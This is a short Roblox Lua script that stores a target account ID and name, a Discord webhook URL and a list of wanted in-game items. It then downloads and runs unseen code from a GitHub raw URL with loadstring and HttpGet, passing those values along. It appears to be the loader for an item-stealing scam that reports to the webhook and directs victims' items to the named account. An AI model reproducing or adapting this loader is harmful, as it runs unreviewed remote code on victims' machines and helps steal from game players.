local TARGET_ID = 873716
local TARGET_USER = "Chocola"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1549883791898710036/-8NzKORSruB-0OAsAyeHP1tK6wU4QrNVHbLagUc-b9m_ZJudlaQa0D2K7Iwv7SqTnHSg"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true
}

local TargetBaseSkins = {
    
}

local TargetGears = {
    
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)